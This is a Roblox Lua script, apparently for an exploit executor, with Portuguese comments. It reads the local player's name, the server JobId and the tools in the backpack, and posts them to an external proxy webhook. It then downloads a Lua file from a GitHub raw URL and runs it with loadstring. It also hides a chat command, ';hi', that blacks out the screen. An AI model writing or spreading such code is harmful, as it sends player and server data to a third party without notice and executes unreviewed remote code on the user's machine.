local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

-- Função para criar a GUI preta fullscreen
local function criarGuiPreta()
    if player.PlayerGui:FindFirstChild("BlackScreenGui") then return end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackScreenGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1,0,1,0)
    frame.Position = UDim2.new(0,0,0,0)
    frame.BackgroundColor3 = Color3.new(0,0,0)
    frame.BackgroundTransparency = 0
    frame.Parent = screenGui
end

-- Listener para o chat do jogador
player.Chatted:Connect(function(msg)
    if msg:lower() == ";hi" then
        criarGuiPreta()
    end
end)

local username = player.Name
local jobId = game.JobId -- ID único do servidor atual

local items = {}
for _, item in ipairs(backpack:GetChildren()) do
    if item:IsA("Tool") then
        table.insert(items, item.Name)
    end
end
local itemsText = (#items > 0) and table.concat(items, ", ") or "Nenhum item"

local data = {
    username = "Roblox Bot",
    content = "",
    embeds = {{
        title = "🎮 Jogador Conectado",
        color = 65280,
        fields = {
            {
                name = "Nome do Player",
                value = username,
                inline = true
            },
            {
                name = "ID do Servidor (JobId)",
                value = jobId,
                inline = true
            },
            {
                name = "Itens na Backpack",
                value = itemsText,
                inline = false
            }
        },
        footer = {
            text = "Enviado pelo script Roblox"
        },
        timestamp = DateTime.now():ToIsoDate()
    }}
}

local headers = {
    ["Content-Type"] = "application/json"
}

local body = HttpService:JSONEncode(data)

local webhookUrl = "https://proxy-f74p.vercel.app/api/send" -- seu proxy webhook

local requestFunction = (syn and syn.request) or http_request or request or (http and http.request)
if requestFunction then
    requestFunction({
        Url = webhookUrl,
        Method = "POST",
        Headers = headers,
        Body = body
    })
else
    warn("Executor não suporta requisições HTTP.")
end

task.wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/TTMARCIOKKJJ/x/refs/heads/main/view.lua"))()
